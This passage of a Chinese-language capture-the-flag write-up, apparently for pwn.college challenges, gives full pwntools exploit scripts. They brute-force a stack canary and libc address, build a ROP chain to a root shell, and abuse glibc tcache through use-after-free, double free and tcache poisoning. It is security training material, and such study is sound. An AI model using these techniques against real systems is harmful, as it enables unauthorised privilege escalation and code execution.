class="hljs-number">0x7d3e08419000</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>主要fork下，不是很好调试。不然可以分析一下为什么一会出现canary一会没有出现canary。</p><h4 id="level14-1-2"><a href="#level14-1-2" class="headerlink" title="level14.1"></a>level14.1</h4><p>一样的过程，改偏移地址就行。（包括challenge函数执行后的返回地址，因为是用它算的main基地址）</p><h4 id="level15-0-2"><a href="#level15-0-2" class="headerlink" title="level15.0"></a>level15.0</h4><p>貌似我上一道题有点曲折了，拿到main的基地址就能做很多事了，但是我在ROPgadget中确实没看到systemcall啥的gadget能用。不过好处是，这题反而比上一题简单了。不用爆破main基地址，直接爆破libc基地址，然后就能获得shell。</p><p>返回的libc偏移地址为：<code>0x79dc58fd5083 - 0x79dc58fb1000 = 0x24083 </code></p><p>最后减去就是libc_base的地址。</p><p>但是，有个前提，由于我们无法确定返回到libc_start中是否正确。因此返回地址的最低字节不能是<code>0x83</code>，这样的话就不能控制程序再次调用mian了。所以，爆破libc_addr时，可以以是否再次执行mian来判断该字节爆破的是否正确。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kill_babyrop_processes</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 查找所有 babyrop_level15 进程</span><br>        pids = subprocess.check_output([<span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;babyrop_level15&quot;</span>]).decode().split()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pids) &gt; <span class="hljs-number">1</span>:       <span class="hljs-comment"># 当出现阻塞进程时</span><br>            subprocess.run([<span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;-9&quot;</span>, pids[<span class="hljs-number">1</span>]], check=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 杀死第二个pid，因为新出现的阻塞进程pid一定会大于原先的pid</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Killed babyrop_level15 (PID: <span class="hljs-subst">&#123;pids[<span class="hljs-number">1</span>]&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 没有找到进程</span><br><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak libc_addr</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>libc_addr = p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = libc_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Welcome to&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        libc_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(libc_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>    kill_babyrop_processes()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(libc_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: calculate libc_base</span><br>kill_babyrop_processes()<br>libc.address = u64(libc_addr) - <span class="hljs-number">0x24060</span>  <span class="hljs-comment"># 注意是减0x60了，而不是0x83，因为我们的返回地址最低字节被手动设置了。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里需要杀死后面出现的进程，为什么呢？因为每次返回地址爆破成功时，会导致重新执行main，也就会重新执行listen等等。每爆破一个字节成功，就会重新成为server，并执行到read。那么此时就是阻塞的状态，等待用户输入。所以我们需要将新出现的进程杀死。以便爆破后面的字节。</p><h4 id="level15-1-2"><a href="#level15-1-2" class="headerlink" title="level15.1"></a>level15.1</h4><p>改偏移即可。ROP完结撒花！</p><h3 id="Dynamic-Allocator-Misuse"><a href="#Dynamic-Allocator-Misuse" class="headerlink" title="Dynamic Allocator Misuse"></a>Dynamic Allocator Misuse</h3><p>The glibc heap consists of many components distinct parts that balance performance and security. In this introduction to the heap, the thread caching layer, <code>tcache</code> will be targeted for exploitation. <code>tcache</code> is a fast thread-specific caching layer that is often the first point of interaction for programs working with dynamic memory allocations.</p><blockquote><p>glibc堆由许多组件组成，这些组件是平衡性能和安全性的不同部分。在本文对堆（线程缓存层）的介绍中，缓存将成为开发的目标。Tcache是一种特定于线程的快速缓存层，它通常是处理动态内存分配的程序的第一个交互点。</p></blockquote><h4 id="level1-0-2"><a href="#level1-0-2" class="headerlink" title="level1.0"></a>level1.0</h4><p>了解tcache的结构，这是一个UAF。也就是先malloc，然后free，然后read_flag，那么read_flag的时候会复用最先的创建的chunk。当然这里有个前提，就是需要在同一个bin中。同一个bin中存放大小相同的chunk。关于tcache结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>这个<code>TCACHE_MAX_BINS</code> 默认64（64位系统），每个bin存放大小相同的chunk。每个bin的大小范围：<code>bin[i]</code> 存放大小为 <code>16 + 16*i</code> 的块（如 <code>bin[0]</code>&#x3D;16字节，<code>bin[1]</code>&#x3D;32字节，…，<code>bin[63]</code>&#x3D;1032字节）。</p><h4 id="level1-1-2"><a href="#level1-1-2" class="headerlink" title="level1.1"></a>level1.1</h4><p>一样的，用ida打开看看malloc的size即可。</p><h4 id="level2-0-2"><a href="#level2-0-2" class="headerlink" title="level2.0"></a>level2.0</h4><p>这题size是随机的，但是.0是可以直接看到的。所以逻辑没变。依然先malloc，再free，再read_flag</p><h4 id="level2-1-2"><a href="#level2-1-2" class="headerlink" title="level2.1"></a>level2.1</h4><p>这题就爆破一下bin就好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level2.1&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">63</span>):<br>    size = <span class="hljs-number">32</span> + <span class="hljs-number">16</span>*i<br>    size = <span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-comment"># malloc</span><br>    out = p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;pwn.&quot;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(out)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># payload = b&quot;malloc &quot;+ size</span><br>    <span class="hljs-comment"># print(payload)</span><br>    p.sendline(<span class="hljs-string">b&quot;malloc &quot;</span>+ size)<br>    <span class="hljs-comment"># free</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;free&quot;</span>)<br>    <span class="hljs-comment"># read_flag</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;read_flag&quot;</span>)<br>    <span class="hljs-comment"># puts</span><br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/read_flag/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;puts&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level3-0-2"><a href="#level3-0-2" class="headerlink" title="level3.0"></a>level3.0</h4><p>这题主要考虑是LIFO（后进先出）的free策略。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">void</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第一次分配 347 字节</span><br>    <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第二次分配 347 字节</span><br>    <span class="hljs-built_in">free</span>(p1);                <span class="hljs-comment">// 释放 p1</span><br>    <span class="hljs-built_in">free</span>(p2);                <span class="hljs-comment">// 释放 p2</span><br>    <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第三次分配 347 字节</span><br>    <span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第四次分配 347 字节</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1=%p, p2=%p, p3=%p, p4=%p\n&quot;</span>, p1, p2, p3, p4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这种情况下的执行结果为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">p1</span>=0x55a1a2b3c4d0, <span class="hljs-attribute">p2</span>=0x55a1a2b3c650, <span class="hljs-attribute">p3</span>=0x55a1a2b3c650, <span class="hljs-attribute">p4</span>=0x55a1a2b3c4d0<br></code></pre></td></tr></table></figure><p>即<code>p3</code>复用<code>p2</code>，<code>p4</code>复用<code>p1</code>（这就是glibc的LIFO行为）</p><blockquote><p><code>free</code>后的内存进入<code>tcache</code>的流程：</p><ol><li><p>检查chunk大小，如果在1032字节内，则优先放入<code>tcache</code>中。</p></li><li><p>插入到<code>bin</code>的链表头部（LIFO策略）</p><p>例如，free(ptr1)和free(ptr2)后，会变成<code>tcache-&gt;bins[size_class] → ptr2 → ptr1 → NULL</code>，那么下次malloc时会优先分配<code>ptr2</code>的chunk。</p></li><li><p>如果<code>bin</code>已满（超过7个），多余的chunk会进入<code>fastbin</code>或者<code>smallbin</code>（取决于大小）。</p></li></ol></blockquote><p>所以这题先a &#x3D; malloc(347), b &#x3D; malloc(347)。然后再free(a), free(b)。 再read_flag，再puts(a)就行了。</p><h4 id="level3-1-2"><a href="#level3-1-2" class="headerlink" title="level3.1"></a>level3.1</h4><p>方法相同</p><h4 id="level4-0-3"><a href="#level4-0-3" class="headerlink" title="level4.0"></a>level4.0</h4><p>记住一点，free的时候只是判断chunk的key是否等于线程key而已。而线程key实际上是在创建时堆的tcache entry的地址。因此，在进行double free的时候，只需要覆盖掉key就行了。</p><p>而key和next在user_data的起始地址。这是一个复用，也就是在<code>tcachebin</code>中（free后），user_data的起始地址会变成<code>next</code>的起始地址，其后紧跟着的是<code>key</code>。</p><p>这里，可以通过scanf来将key覆盖掉，使其不等于线程key，从而可以进行二次free。</p><p>也就是，先<code>malloc 223</code>，然后<code>free</code>，然后再<code>scanf</code>，再输入一个长度大于8的字符串，然后再<code>free</code>，此时在<code>tcache bin</code>中就有两项，并且地址相同。那么这时候再使用<code>read_flag</code>即可。最后<code>puts</code>拿到flag</p><h4 id="level4-1-3"><a href="#level4-1-3" class="headerlink" title="level4.1"></a>level4.1</h4><p>思路一致</p><h4 id="level5-0-3"><a href="#level5-0-3" class="headerlink" title="level5.0"></a>level5.0</h4><p>这里ida打开查看源码，发现puts_flag的选项是直接打印出flag。但是有一个验证，也就是需要flag所在的chunk中，前16字节有数据。</p><p>但是，它有一个操作，就是<code>read_flag</code>每次<code>malloc</code>的时候都会将前8个字节直接置0，从而导致无法<code>puts_flag</code>。所以，需要将<code>read_flag</code>的<code>chunk</code>进行<code>free</code>，使其进入<code>bin</code>中，如果<code>read_flag</code>的<code>chunk</code>进入<code>tcache_bin</code>中时，<code>tcache_bin</code>为空的话那么<code>next</code>依然为空，还是无法通过<code>puts_flag</code>进行读取，因此要保证进入<code>tcache_bin</code>时，其不为空才行。</p><p>思路就是：先<code>malloc</code>两个chunk，然后再<code>free</code>掉。再使用<code>read_flag</code>将其中一个chunk给覆盖flag。然后再free掉，此时read_flag就进入了<code>tcache_bin</code>，且此时其不为空，next有值。那么就可以<code>puts_flag</code>了。</p><h4 id="level5-1-3"><a href="#level5-1-3" class="headerlink" title="level5.1"></a>level5.1</h4><p>思路一致：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): malloc 0 472<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): malloc 1 472<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 0<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 1<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): read_flag<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 1<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): puts_flag<br></code></pre></td></tr></table></figure><h4 id="level6-0-2"><a href="#level6-0-2" class="headerlink" title="level6.0"></a>level6.0</h4><p>这题需要我们暴露secret，然后执行<code>send_flag</code>再输入这个secret就可以拿到flag了。</p><p>思路是：<code>malloc</code>两次，然后再<code>free</code>两次。最后<code>scanf</code>把leak的地址写入next中，然后再malloc两次这样就拿到secret的数据，再puts出来，然后就可以用<code>send_flag</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level6.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x428d30</span>))<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;puts 0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level6-1-2"><a href="#level6-1-2" class="headerlink" title="level6.1"></a>level6.1</h4><p>这题也是同理，但是leak_address需要改一下，因为这题没有开启PIE，也就是用ida打开就能拿到地址了。</p><h4 id="level7-0-2"><a href="#level7-0-2" class="headerlink" title="level7.0"></a>level7.0</h4><p>除了泄露外（我尝试了一下泄露，但是发现16字节的情况下，key会在每次malloc后被修改，所以还是直接scanf将secret的地址直接改成其他数据方便），其实我们可以用scanf修改secret地址的值，然后send_flag时输入我们之前修改的值就能绕过了。</p><h4 id="level7-1-2"><a href="#level7-1-2" class="headerlink" title="level7.1"></a>level7.1</h4><p>思路一致，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level7.1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p32(<span class="hljs-number">0x424a2a</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level8-0-2"><a href="#level8-0-2" class="headerlink" 